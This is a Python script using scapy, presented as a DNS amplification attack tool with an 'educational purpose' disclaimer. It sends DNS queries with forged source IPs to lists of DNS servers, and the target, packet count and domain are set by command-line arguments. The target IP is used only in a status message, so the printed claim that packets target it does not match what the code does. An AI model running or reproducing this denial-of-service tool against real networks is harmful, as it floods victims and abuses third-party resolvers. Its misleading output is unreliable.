
###############################################################################
##                                                                            ##
##             Author: MAhmutAY   <mahmutayy@yahoo.com>                       ##
##              This is a DNS Amplification attack script                     ##
##                                                                            ##
##              This is only educational purpose usage                        ##
##  !!  Do not attempt to violate the laws with anything contained here. !!!  ##
################################################################################

import random , argparse
from scapy.all import IP , UDP ,DNS ,DNSQR ,send 


def dns_amp(target_ip, dns_servers, spoofed_ips, packet_count, domain):
    for i in range(packet_count):
        # Choose a random DNS server and spoofed IP address from the lists
        dns_server = random.choice(dns_servers)
        spoofed_ip = random.choice(spoofed_ips)

        # Create the IP layer with the spoofed source IPs and DNS server as destination IP
        ip_layer = IP(src=spoofed_ip, dst=dns_server)

        # Create the UDP layer with source port 53 (DNS)
        udp_layer = UDP(sport=53, dport=53)

        # Create the DNS request layer
        dns_layer = DNS(rd=1, qd=DNSQR(qname=domain))

        # Build the packet
        packet = ip_layer / udp_layer / dns_layer

        # Send the packet ( verbose is closed )
        send(packet, verbose=False)

        # Print status
        print(f"Sent packet {i+1} from {spoofed_ip} to DNS server {dns_server} targeting {target_ip}")

if __name__ == "__main__":
    # Create the argument parser
    parser = argparse.ArgumentParser(description="DNS Amplification Attack Script")

    # Add arguments
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("dns_servers_file", help="File containing DNS server IP addresses")    # please create a file which contains the DNS server Ips 
    parser.add_argument("spoofed_ips_file", help="File containing spoofed IP addresses")       # please Create a file which contains  Spoofed IP adresses 
    parser.add_argument("packet_count", type=int, help="How many packets do you  send ?")
    parser.add_argument("domain", help="Domain to query for amplification")

    # Parse the arguments
    args = parser.parse_args()

    # Read the DNS server IP addresses from the file
    with open(args.dns_servers_file, 'r') as file:
        dns_servers = [line.strip() for line in file]

    # Read the spoofed IP addresses from the file
    with open(args.spoofed_ips_file, 'r') as file:
        spoofed_ips = [line.strip() for line in file]

    # Let's Run the DNS amplification attack
    dns_amp(args.target_ip, dns_servers, spoofed_ips, args.packet_count, args.domain)
